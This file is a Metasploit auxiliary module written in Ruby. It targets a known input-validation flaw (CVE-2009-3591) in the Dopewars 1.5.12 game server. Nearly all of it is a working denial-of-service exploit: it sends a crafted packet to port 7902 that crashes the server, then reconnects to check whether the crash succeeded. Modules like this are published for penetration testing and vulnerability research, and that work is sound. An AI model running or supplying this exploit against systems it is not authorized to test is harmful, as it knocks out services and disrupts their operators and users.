##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'			 => 'Dopewars Denial of Service',
      'Description'	 => %q{
          The jet command in Dopewars 1.5.12 is vulnerable to a segmentation fault due to
        a lack of input validation.
      },
      'Author'		 => [ 'Doug Prostko <dougtko[at]gmail.com>' ],
      'License'		 => MSF_LICENSE,
      'References'	 =>
        [
          [ 'CVE', '2009-3591' ],
          [ 'OSVDB', '58884' ],
          [ 'BID', '36606' ]
        ],
      'DisclosureDate' => "Oct 05 2009" ))

    register_options([Opt::RPORT(7902)])
  end

  def run
    # The jet command is vulnerable.
    # Program received signal SIGSEGV, Segmentation fault.
    # [Switching to Thread 0xb74916c0 (LWP 30638)]
    # 0x08062f6e in HandleServerMessage (buf=0x8098828 "", Play=0x809a000) at
    # serverside.c:525
    # 525			dopelog(4, LF_SERVER, "%s jets to %s",
    #
    connect
    pkt =  "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
    print_status("Sending dos packet...")
    sock.put(pkt)
    disconnect

    print_status("Checking for success...")
    select(nil, nil, nil, 2)
    begin
      connect
    rescue ::Interrupt
      raise $!
    rescue ::Rex::ConnectionRefused
      print_good("Dopewars server successfully shut down!")
    else
      print_error("DOS attack unsuccessful")
    ensure
      disconnect
    end
  end
end
